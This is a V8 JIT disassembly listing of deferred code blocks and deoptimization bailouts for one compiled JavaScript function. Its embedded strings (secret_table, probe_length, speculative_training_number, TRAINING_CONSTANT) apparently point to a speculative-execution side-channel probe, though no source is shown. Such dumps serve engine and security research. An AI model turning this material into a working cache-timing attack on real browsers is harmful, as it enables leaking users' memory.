0x17249087769c   cfc  e9e6010000     jmp 0x172490877887  <+0xee7>
                  -- B119 start (deferred) --
0x1724908776a1   d01  4d89e3         REX.W movq r11,r12
0x1724908776a4   d04  4c8b9560ffffff REX.W movq r10,[rbp-0xa0]
0x1724908776ab   d0b  4c899558ffffff REX.W movq [rbp-0xa8],r10
0x1724908776b2   d12  4c89a560ffffff REX.W movq [rbp-0xa0],r12
0x1724908776b9   d19  e90c020000     jmp 0x1724908778ca  <+0xf2a>
                  -- B120 start (deferred) --
0x1724908776be   d1e  4c8b9558ffffff REX.W movq r10,[rbp-0xa8]
0x1724908776c5   d25  4c899570ffffff REX.W movq [rbp-0x90],r10
0x1724908776cc   d2c  4c898d58ffffff REX.W movq [rbp-0xa8],r9
0x1724908776d3   d33  e937020000     jmp 0x17249087790f  <+0xf6f>
                  -- B121 start (deferred) --
0x1724908776d8   d38  4c8b9560ffffff REX.W movq r10,[rbp-0xa0]
0x1724908776df   d3f  ffb570ffffff   push [rbp-0x90]
0x1724908776e5   d45  8f8560ffffff   pop [rbp-0xa0]
0x1724908776eb   d4b  4c899570ffffff REX.W movq [rbp-0x90],r10
0x1724908776f2   d52  e948020000     jmp 0x17249087793f  <+0xf9f>
                  -- B122 start (deferred) --
0x1724908776f7   d57  488b9560ffffff REX.W movq rdx,[rbp-0xa0]
0x1724908776fe   d5e  c5fb108550ffffff vmovsd xmm0,[rbp-0xb0]
0x172490877706   d66  48c78548ffffff00000000 REX.W movq [rbp-0xb8],0x0
0x172490877711   d71  c5fb118558ffffff vmovsd [rbp-0xa8],xmm0
                  -- B123 start (deferred) --
0x172490877719   d79  48898550ffffff REX.W movq [rbp-0xb0],rax
0x172490877720   d80  48b8a180258ed8390000 REX.W movq rax,0x39d88e2580a1    ;; object: 0x39d88e2580a1 <String[4]: junk>
0x17249087772a   d8a  50             push rax
                  -- <not inlined:1781> --
0x17249087772b   d8b  4c898d40ffffff REX.W movq [rbp-0xc0],r9
0x172490877732   d92  4c898570ffffff REX.W movq [rbp-0x90],r8
0x172490877739   d99  488b1d4afeffff REX.W movq rbx,[rip+0xfffffe4a]
0x172490877740   da0  b801000000     movl rax,0x1
0x172490877745   da5  488b7580       REX.W movq rsi,[rbp-0x80]
0x172490877749   da9  e8b283f5ff     call 0x1724907cfb00  (CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit)    ;; code: Builtin::CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit
                  -- B124 start (deferred) --
0x17249087774e   dae  488b9560ffffff REX.W movq rdx,[rbp-0xa0]
0x172490877755   db5  488bbd58ffffff REX.W movq rdi,[rbp-0xa8]
0x17249087775c   dbc  c5fb108550ffffff vmovsd xmm0,[rbp-0xb0]
0x172490877764   dc4  33db           xorl rbx,rbx
0x172490877766   dc6  48899d48ffffff REX.W movq [rbp-0xb8],rbx
0x17249087776d   dcd  48899570ffffff REX.W movq [rbp-0x90],rdx
0x172490877774   dd4  4889bd60ffffff REX.W movq [rbp-0xa0],rdi
0x17249087777b   ddb  c5fb118558ffffff vmovsd [rbp-0xa8],xmm0
                  -- B125 start (deferred) --
0x172490877783   de3  48898550ffffff REX.W movq [rbp-0xb0],rax
0x17249087778a   dea  48b8a981258ed8390000 REX.W movq rax,0x39d88e2581a9    ;; object: 0x39d88e2581a9 <String[12]: secret_table>
0x172490877794   df4  50             push rax
                  -- <not inlined:1598> --
0x172490877795   df5  4c898540ffffff REX.W movq [rbp-0xc0],r8
0x17249087779c   dfc  488b1de7fdffff REX.W movq rbx,[rip+0xfffffde7]
0x1724908777a3   e03  b801000000     movl rax,0x1
0x1724908777a8   e08  488b7580       REX.W movq rsi,[rbp-0x80]
0x1724908777ac   e0c  e84f83f5ff     call 0x1724907cfb00  (CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit)    ;; code: Builtin::CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit
                  -- B126 start (deferred) --
0x1724908777b1   e11  488b9560ffffff REX.W movq rdx,[rbp-0xa0]
0x1724908777b8   e18  488bbd58ffffff REX.W movq rdi,[rbp-0xa8]
0x1724908777bf   e1f  c5fb108550ffffff vmovsd xmm0,[rbp-0xb0]
0x1724908777c7   e27  48899d40ffffff REX.W movq [rbp-0xc0],rbx
0x1724908777ce   e2e  48c78548ffffff00000000 REX.W movq [rbp-0xb8],0x0
0x1724908777d9   e39  48899570ffffff REX.W movq [rbp-0x90],rdx
0x1724908777e0   e40  4889bd60ffffff REX.W movq [rbp-0xa0],rdi
0x1724908777e7   e47  c5fb118558ffffff vmovsd [rbp-0xa8],xmm0
                  -- B127 start (deferred) --
0x1724908777ef   e4f  48898550ffffff REX.W movq [rbp-0xb0],rax
0x1724908777f6   e56  48b82181258ed8390000 REX.W movq rax,0x39d88e258121    ;; object: 0x39d88e258121 <String[9]: page_size>
0x172490877800   e60  50             push rax
                  -- <not inlined:1528> --
0x172490877801   e61  488b1d82fdffff REX.W movq rbx,[rip+0xfffffd82]
0x172490877808   e68  b801000000     movl rax,0x1
0x17249087780d   e6d  488b7580       REX.W movq rsi,[rbp-0x80]
0x172490877811   e71  e8ea82f5ff     call 0x1724907cfb00  (CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit)    ;; code: Builtin::CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit
                  -- B128 start (deferred) --
0x172490877816   e76  4889bd60ffffff REX.W movq [rbp-0xa0],rdi
0x17249087781d   e7d  48c78550ffffff00000000 REX.W movq [rbp-0xb0],0x0
                  -- B129 start (deferred) --
0x172490877828   e88  48b84981258ed8390000 REX.W movq rax,0x39d88e258149    ;; object: 0x39d88e258149 <String[12]: probe_length>
0x172490877832   e92  50             push rax
                  -- <not inlined:1354> --
0x172490877833   e93  48899d48ffffff REX.W movq [rbp-0xb8],rbx
0x17249087783a   e9a  c5fb118558ffffff vmovsd [rbp-0xa8],xmm0
0x172490877842   ea2  48899570ffffff REX.W movq [rbp-0x90],rdx
0x172490877849   ea9  488b1d3afdffff REX.W movq rbx,[rip+0xfffffd3a]
0x172490877850   eb0  b801000000     movl rax,0x1
0x172490877855   eb5  488b7580       REX.W movq rsi,[rbp-0x80]
0x172490877859   eb9  e8a282f5ff     call 0x1724907cfb00  (CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit)    ;; code: Builtin::CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit
                  -- B130 start (deferred) --
0x17249087785e   ebe  4c898d48ffffff REX.W movq [rbp-0xb8],r9
0x172490877865   ec5  c57b10bd50ffffff vmovsd xmm15,[rbp-0xb0]
0x17249087786d   ecd  c57b11bd58ffffff vmovsd [rbp-0xa8],xmm15
0x172490877875   ed5  48c78550ffffff00000000 REX.W movq [rbp-0xb0],0x0
0x172490877880   ee0  4889bd60ffffff REX.W movq [rbp-0xa0],rdi
                  -- B131 start (deferred) --
0x172490877887   ee7  48b8a180258ed8390000 REX.W movq rax,0x39d88e2580a1    ;; object: 0x39d88e2580a1 <String[4]: junk>
0x172490877891   ef1  50             push rax
                  -- <not inlined:1209> --
0x172490877892   ef2  48899570ffffff REX.W movq [rbp-0x90],rdx
0x172490877899   ef9  488b1deafcffff REX.W movq rbx,[rip+0xfffffcea]
0x1724908778a0   f00  b801000000     movl rax,0x1
0x1724908778a5   f05  488b7580       REX.W movq rsi,[rbp-0x80]
0x1724908778a9   f09  e85282f5ff     call 0x1724907cfb00  (CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit)    ;; code: Builtin::CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit
                  -- B132 start (deferred) --
0x1724908778ae   f0e  4c8bdf         REX.W movq r11,rdi
0x1724908778b1   f11  48898d50ffffff REX.W movq [rbp-0xb0],rcx
0x1724908778b8   f18  48c78558ffffff00000000 REX.W movq [rbp-0xa8],0x0
0x1724908778c3   f23  4889bd60ffffff REX.W movq [rbp-0xa0],rdi
                  -- B133 start (deferred) --
0x1724908778ca   f2a  48b82181258ed8390000 REX.W movq rax,0x39d88e258121    ;; object: 0x39d88e258121 <String[9]: page_size>
0x1724908778d4   f34  50             push rax
                  -- <not inlined:1114> --
0x1724908778d5   f35  48899570ffffff REX.W movq [rbp-0x90],rdx
0x1724908778dc   f3c  488b1da7fcffff REX.W movq rbx,[rip+0xfffffca7]
0x1724908778e3   f43  b801000000     movl rax,0x1
0x1724908778e8   f48  488b7580       REX.W movq rsi,[rbp-0x80]
0x1724908778ec   f4c  e80f82f5ff     call 0x1724907cfb00  (CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit)    ;; code: Builtin::CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit
                  -- B134 start (deferred) --
0x1724908778f1   f51  33c0           xorl rax,rax
0x1724908778f3   f53  48898d58ffffff REX.W movq [rbp-0xa8],rcx
0x1724908778fa   f5a  4c8b9560ffffff REX.W movq r10,[rbp-0xa0]
0x172490877901   f61  4c899570ffffff REX.W movq [rbp-0x90],r10
0x172490877908   f68  48898560ffffff REX.W movq [rbp-0xa0],rax
                  -- B135 start (deferred) --
0x17249087790f   f6f  48b841256058ec2a0000 REX.W movq rax,0x2aec58602541    ;; object: 0x2aec58602541 <String[7]: address>
0x172490877919   f79  50             push rax
                  -- <not inlined:1051> --
0x17249087791a   f7a  488b1d69fcffff REX.W movq rbx,[rip+0xfffffc69]
0x172490877921   f81  b801000000     movl rax,0x1
0x172490877926   f86  488b7580       REX.W movq rsi,[rbp-0x80]
0x17249087792a   f8a  e8d181f5ff     call 0x1724907cfb00  (CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit)    ;; code: Builtin::CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit
                  -- B136 start (deferred) --
0x17249087792f   f8f  48899d60ffffff REX.W movq [rbp-0xa0],rbx
0x172490877936   f96  33c0           xorl rax,rax
0x172490877938   f98  48898570ffffff REX.W movq [rbp-0x90],rax
                  -- B137 start (deferred) --
0x17249087793f   f9f  48b87181258ed8390000 REX.W movq rax,0x39d88e258171    ;; object: 0x39d88e258171 <String[27]: speculative_training_number>
0x172490877949   fa9  50             push rax
                  -- <not inlined:906> --
0x17249087794a   faa  488b1d39fcffff REX.W movq rbx,[rip+0xfffffc39]
0x172490877951   fb1  b801000000     movl rax,0x1
0x172490877956   fb6  488b7580       REX.W movq rsi,[rbp-0x80]
0x17249087795a   fba  e8a181f5ff     call 0x1724907cfb00  (CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit)    ;; code: Builtin::CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit
                  -- B138 start (deferred) --
0x17249087795f   fbf  48b82181258ed8390000 REX.W movq rax,0x39d88e258121    ;; object: 0x39d88e258121 <String[9]: page_size>
0x172490877969   fc9  50             push rax
                  -- <not inlined:866> --
0x17249087796a   fca  48898d68ffffff REX.W movq [rbp-0x98],rcx
0x172490877971   fd1  4889bd60ffffff REX.W movq [rbp-0xa0],rdi
0x172490877978   fd8  488b1d0bfcffff REX.W movq rbx,[rip+0xfffffc0b]
0x17249087797f   fdf  b801000000     movl rax,0x1
0x172490877984   fe4  488b7580       REX.W movq rsi,[rbp-0x80]
0x172490877988   fe8  e87381f5ff     call 0x1724907cfb00  (CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit)    ;; code: Builtin::CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit
                  -- B139 start (deferred) --
0x17249087798d   fed  48b87181258ed8390000 REX.W movq rax,0x39d88e258171    ;; object: 0x39d88e258171 <String[27]: speculative_training_number>
0x172490877997   ff7  50             push rax
                  -- <not inlined:836> --
0x172490877998   ff8  48898d68ffffff REX.W movq [rbp-0x98],rcx
0x17249087799f   fff  488b1de4fbffff REX.W movq rbx,[rip+0xfffffbe4]
0x1724908779a6  1006  b801000000     movl rax,0x1
0x1724908779ab  100b  488b7580       REX.W movq rsi,[rbp-0x80]
0x1724908779af  100f  e84c81f5ff     call 0x1724907cfb00  (CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit)    ;; code: Builtin::CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit
                  -- B140 start (deferred) --
0x1724908779b4  1014  48b8f180258ed8390000 REX.W movq rax,0x39d88e2580f1    ;; object: 0x39d88e2580f1 <String[17]: TRAINING_CONSTANT>
0x1724908779be  101e  50             push rax
                  -- <not inlined:750> --
0x1724908779bf  101f  48899d70ffffff REX.W movq [rbp-0x90],rbx
0x1724908779c6  1026  488b1dbdfbffff REX.W movq rbx,[rip+0xfffffbbd]
0x1724908779cd  102d  b801000000     movl rax,0x1
0x1724908779d2  1032  488b7580       REX.W movq rsi,[rbp-0x80]
0x1724908779d6  1036  e82581f5ff     call 0x1724907cfb00  (CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit)    ;; code: Builtin::CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit
                  -- Out of line code --
0x1724908779db  103b  4883ec08       REX.W subq rsp,0x8
0x1724908779df  103f  c5fb110424     vmovsd [rsp],xmm0
0x1724908779e4  1044  e8b7b5f5ff     call 0x1724907d2fa0  (DoubleToI)    ;; code: Builtin::DoubleToI
0x1724908779e9  1049  8b1c24         movl rbx,[rsp]
0x1724908779ec  104c  4883c408       REX.W addq rsp,0x8
0x1724908779f0  1050  e90ef6ffff     jmp 0x172490877003  <+0x663>
0x1724908779f5  1055  4883ec08       REX.W subq rsp,0x8
0x1724908779f9  1059  c5fb110424     vmovsd [rsp],xmm0
0x1724908779fe  105e  e89db5f5ff     call 0x1724907d2fa0  (DoubleToI)    ;; code: Builtin::DoubleToI
0x172490877a03  1063  448b0c24       movl r9,[rsp]
0x172490877a07  1067  4883c408       REX.W addq rsp,0x8
0x172490877a0b  106b  e941f5ffff     jmp 0x172490876f51  <+0x5b1>
0x172490877a10  1070  4883ec08       REX.W subq rsp,0x8
0x172490877a14  1074  c5fb110424     vmovsd [rsp],xmm0
0x172490877a19  1079  e882b5f5ff     call 0x1724907d2fa0  (DoubleToI)    ;; code: Builtin::DoubleToI
0x172490877a1e  107e  448b1c24       movl r11,[rsp]
0x172490877a22  1082  4883c408       REX.W addq rsp,0x8
0x172490877a26  1086  e9e5f1ffff     jmp 0x172490876c10  <+0x270>
0x172490877a2b  108b  4883ec08       REX.W subq rsp,0x8
0x172490877a2f  108f  c5fb110424     vmovsd [rsp],xmm0
0x172490877a34  1094  e867b5f5ff     call 0x1724907d2fa0  (DoubleToI)    ;; code: Builtin::DoubleToI
0x172490877a39  1099  8b0c24         movl rcx,[rsp]
0x172490877a3c  109c  4883c408       REX.W addq rsp,0x8
0x172490877a40  10a0  e925f1ffff     jmp 0x172490876b6a  <+0x1ca>
0x172490877a45  10a5  90             nop
0x172490877a46  10a6  e8f5c50000     call 0x172490884040     ;; debug: deopt position, script offset '748'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'not a Smi'
                                                             ;; debug: deopt index 0
                                                             ;; eager deoptimization bailout 0
0x172490877a4b  10ab  e8f5c50000     call 0x172490884045     ;; debug: deopt position, script offset '748'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'not a Smi'
                                                             ;; debug: deopt index 1
                                                             ;; eager deoptimization bailout 1
0x172490877a50  10b0  e8f5c50000     call 0x17249088404a     ;; debug: deopt position, script offset '864'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'not a Smi'
                                                             ;; debug: deopt index 2
                                                             ;; eager deoptimization bailout 2
0x172490877a55  10b5  e8f5c50000     call 0x17249088404f     ;; debug: deopt position, script offset '864'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'not a Smi'
                                                             ;; debug: deopt index 3
                                                             ;; eager deoptimization bailout 3
0x172490877a5a  10ba  e8f5c50000     call 0x172490884054     ;; debug: deopt position, script offset '864'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'overflow'
                                                             ;; debug: deopt index 4
                                                             ;; eager deoptimization bailout 4
0x172490877a5f  10bf  e8f5c50800     call 0x172490904059     ;; debug: deopt position, script offset '821'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason '(unknown)'
                                                             ;; debug: deopt index 5
                                                             ;; lazy deoptimization bailout 5
0x172490877a64  10c4  e8f5c50000     call 0x17249088405e     ;; debug: deopt position, script offset '904'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'not a Smi'
                                                             ;; debug: deopt index 6
                                                             ;; eager deoptimization bailout 6
0x172490877a69  10c9  e8f5c50000     call 0x172490884063     ;; debug: deopt position, script offset '1059'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'not a heap number'
                                                             ;; debug: deopt index 7
                                                             ;; eager deoptimization bailout 7
0x172490877a6e  10ce  e8f5c50000     call 0x172490884068     ;; debug: deopt position, script offset '1124'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'not a Number or Oddball'
                                                             ;; debug: deopt index 8
                                                             ;; eager deoptimization bailout 8
0x172490877a73  10d3  e8f5c50000     call 0x17249088406d     ;; debug: deopt position, script offset '1246'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'not a Smi'
                                                             ;; debug: deopt index 9
                                                             ;; eager deoptimization bailout 9
0x172490877a78  10d8  e8f5c50000     call 0x172490884072     ;; debug: deopt position, script offset '1352'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'not a Smi'
                                                             ;; debug: deopt index 10
                                                             ;; eager deoptimization bailout 10
0x172490877a7d  10dd  e8f5c50000     call 0x172490884077     ;; debug: deopt position, script offset '1352'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'overflow'
                                                             ;; debug: deopt index 11
                                                             ;; eager deoptimization bailout 11
0x172490877a82  10e2  e8f5c50000     call 0x17249088407c     ;; debug: deopt position, script offset '1368'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'not a Smi'
                                                             ;; debug: deopt index 12
                                                             ;; eager deoptimization bailout 12
0x172490877a87  10e7  e8f5c50000     call 0x172490884081     ;; debug: deopt position, script offset '1368'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'overflow'
                                                             ;; debug: deopt index 13
                                                             ;; eager deoptimization bailout 13
0x172490877a8c  10ec  e8f5c50800     call 0x172490904086     ;; debug: deopt position, script offset '1334'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason '(unknown)'
                                                             ;; debug: deopt index 14
                                                             ;; lazy deoptimization bailout 14
0x172490877a91  10f1  e8f5c50000     call 0x17249088408b     ;; debug: deopt position, script offset '1526'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'not a Smi'
                                                             ;; debug: deopt index 15
                                                             ;; eager deoptimization bailout 15
0x172490877a96  10f6  e8f5c50000     call 0x172490884090     ;; debug: deopt position, script offset '1523'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'wrong map'
                                                             ;; debug: deopt index 16
                                                             ;; eager deoptimization bailout 16
0x172490877a9b  10fb  e8f5c50000     call 0x172490884095     ;; debug: deopt position, script offset '1523'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'out of bounds'
                                                             ;; debug: deopt index 17
                                                             ;; eager deoptimization bailout 17
0x172490877aa0  1100  e8f5c50000     call 0x17249088409a     ;; debug: deopt position, script offset '1610'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'Smi'
                                                             ;; debug: deopt index 18
                                                             ;; eager deoptimization bailout 18
0x172490877aa5  1105  e8f5c50000     call 0x17249088409f     ;; debug: deopt position, script offset '1610'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'wrong map'
                                                             ;; debug: deopt index 19
                                                             ;; eager deoptimization bailout 19
0x172490877aaa  110a  e8f5c50000     call 0x1724908840a4     ;; debug: deopt position, script offset '1610'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'out of bounds'
                                                             ;; debug: deopt index 20
                                                             ;; eager deoptimization bailout 20
0x172490877aaf  110f  e8f5c50000     call 0x1724908840a9     ;; debug: deopt position, script offset '1820'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'lost precision or NaN'
                                                             ;; debug: deopt index 21
                                                             ;; eager deoptimization bailout 21
0x172490877ab4  1114  e8f5c50000     call 0x1724908840ae     ;; debug: deopt position, script offset '1820'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'overflow'
                                                             ;; debug: deopt index 22
                                                             ;; eager deoptimization bailout 22
0x172490877ab9  1119  e8f5c50000     call 0x1724908840b3     ;; debug: deopt position, script offset '1800'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'wrong map'
                                                             ;; debug: deopt index 23
                                                             ;; eager deoptimization bailout 23
0x172490877abe  111e  e8f5c50000     call 0x1724908840b8     ;; debug: deopt position, script offset '1800'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'out of bounds'
                                                             ;; debug: deopt index 24
                                                             ;; eager deoptimization bailout 24
0x172490877ac3  1123  e8f5c50000     call 0x1724908840bd     ;; debug: deopt position, script offset '1800'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'not a Smi'
                                                             ;; debug: deopt index 25
                                                             ;; eager deoptimization bailout 25
0x172490877ac8  1128  e8f5c50000     call 0x1724908840c2     ;; debug: deopt position, script offset '1936'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'not a Smi'
                                                             ;; debug: deopt index 26
                                                             ;; eager deoptimization bailout 26
0x172490877acd  112d  e8f5c50000     call 0x1724908840c7     ;; debug: deopt position, script offset '1936'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'overflow'
                                                             ;; debug: deopt index 27
                                                             ;; eager deoptimization bailout 27
0x172490877ad2  1132  e8f5c50000     call 0x1724908840cc     ;; debug: deopt position, script offset '2045'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'wrong call target'
                                                             ;; debug: deopt index 28
                                                             ;; eager deoptimization bailout 28
0x172490877ad7  1137  e8f5c50000     call 0x1724908840d1     ;; debug: deopt position, script offset '904'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'not a Smi'
                                                             ;; debug: deopt index 29
                                                             ;; eager deoptimization bailout 29
0x172490877adc  113c  e8f5c50000     call 0x1724908840d6     ;; debug: deopt position, script offset '982'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'overflow'
                                                             ;; debug: deopt index 30
                                                             ;; eager deoptimization bailout 30
0x172490877ae1  1141  e8f5c50000     call 0x1724908840db     ;; debug: deopt position, script offset '1059'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'not a heap number'
                                                             ;; debug: deopt index 31
                                                             ;; eager deoptimization bailout 31
0x172490877ae6  1146  e8f5c50000     call 0x1724908840e0     ;; debug: deopt position, script offset '1124'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'not a Number or Oddball'
                                                             ;; debug: deopt index 32
                                                             ;; eager deoptimization bailout 32
0x172490877aeb  114b  e8f5c50000     call 0x1724908840e5     ;; debug: deopt position, script offset '1246'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'not a Smi'
                                                             ;; debug: deopt index 33
                                                             ;; eager deoptimization bailout 33
0x172490877af0  1150  e8f5c50000     call 0x1724908840ea     ;; debug: deopt position, script offset '1352'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'not a Smi'
                                                             ;; debug: deopt index 34
                                                             ;; eager deoptimization bailout 34
0x172490877af5  1155  e8f5c50000     call 0x1724908840ef     ;; debug: deopt position, script offset '1352'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'overflow'
                                                             ;; debug: deopt index 35
                                                             ;; eager deoptimization bailout 35
0x172490877afa  115a  e8f5c50000     call 0x1724908840f4     ;; debug: deopt position, script offset '1368'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'not a Smi'
                                                             ;; debug: deopt index 36
                                                             ;; eager deoptimization bailout 36
0x172490877aff  115f  e8f5c50000     call 0x1724908840f9     ;; debug: deopt position, script offset '1368'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'overflow'
                                                             ;; debug: deopt index 37
                                                             ;; eager deoptimization bailout 37
0x172490877b04  1164  e8f5c50800     call 0x1724909040fe     ;; debug: deopt position, script offset '1334'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason '(unknown)'
                                                             ;; debug: deopt index 38
                                                             ;; lazy deoptimization bailout 38
0x172490877b09  1169  e8f5c50000     call 0x172490884103     ;; debug: deopt position, script offset '1526'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'not a Smi'
                                                             ;; debug: deopt index 39
                                                             ;; eager deoptimization bailout 39
0x172490877b0e  116e  e8f5c50000     call 0x172490884108     ;; debug: deopt position, script offset '1526'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'overflow'
                                                             ;; debug: deopt index 40
                                                             ;; eager deoptimization bailout 40
0x172490877b13  1173  e8f5c50000     call 0x17249088410d     ;; debug: deopt position, script offset '1523'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'wrong map'
                                                             ;; debug: deopt index 41
                                                             ;; eager deoptimization bailout 41
0x172490877b18  1178  e8f5c50000     call 0x172490884112     ;; debug: deopt position, script offset '1523'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'out of bounds'
                                                             ;; debug: deopt index 42
                                                             ;; eager deoptimization bailout 42
0x172490877b1d  117d  e8f5c50000     call 0x172490884117     ;; debug: deopt position, script offset '1610'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'Smi'
                                                             ;; debug: deopt index 43
                                                             ;; eager deoptimization bailout 43
0x172490877b22  1182  e8f5c50000     call 0x17249088411c     ;; debug: deopt position, script offset '1610'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'wrong map'
                                                             ;; debug: deopt index 44
                                                             ;; eager deoptimization bailout 44
0x172490877b27  1187  e8f5c50000     call 0x172490884121     ;; debug: deopt position, script offset '1610'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'out of bounds'
                                                             ;; debug: deopt index 45
                                                             ;; eager deoptimization bailout 45
0x172490877b2c  118c  e8f5c50000     call 0x172490884126     ;; debug: deopt position, script offset '1820'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'lost precision or NaN'
                                                             ;; debug: deopt index 46
                                                             ;; eager deoptimization bailout 46
0x172490877b31  1191  e8f5c50000     call 0x17249088412b     ;; debug: deopt position, script offset '1820'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'overflow'
                                                             ;; debug: deopt index 47
                                                             ;; eager deoptimization bailout 47
0x172490877b36  1196  e8f5c50000     call 0x172490884130     ;; debug: deopt position, script offset '1800'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'wrong map'
                                                             ;; debug: deopt index 48
                                                             ;; eager deoptimization bailout 48
0x172490877b3b  119b  e8f5c50000     call 0x172490884135     ;; debug: deopt position, script offset '1800'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'out of bounds'
                                                             ;; debug: deopt index 49
                                                             ;; eager deoptimization bailout 49
0x172490877b40  11a0  e8f5c50000     call 0x17249088413a     ;; debug: deopt position, script offset '1800'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'not a Smi'
                                                             ;; debug: deopt index 50
                                                             ;; eager deoptimization bailout 50
0x172490877b45  11a5  e8f5c50000     call 0x17249088413f     ;; debug: deopt position, script offset '1936'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'not a Smi'
                                                             ;; debug: deopt index 51
                                                             ;; eager deoptimization bailout 51
0x172490877b4a  11aa  e8f5c50000     call 0x172490884144     ;; debug: deopt position, script offset '1936'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'overflow'
                                                             ;; debug: deopt index 52
                                                             ;; eager deoptimization bailout 52
0x172490877b4f  11af  e8f5c50000     call 0x172490884149     ;; debug: deopt position, script offset '2045'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'wrong call target'
                                                             ;; debug: deopt index 53
                                                             ;; eager deoptimization bailout 53
0x172490877b54  11b4  e8f5c50000     call 0x17249088414e     ;; debug: deopt position, script offset '771'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'overflow'
                                                             ;; debug: deopt index 54
                                                             ;; eager deoptimization bailout 54
0x172490877b59  11b9  e8f5c50800     call 0x172490904153     ;; debug: deopt position, script offset '730'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason '(unknown)'
                                                             ;; debug: deopt index 55
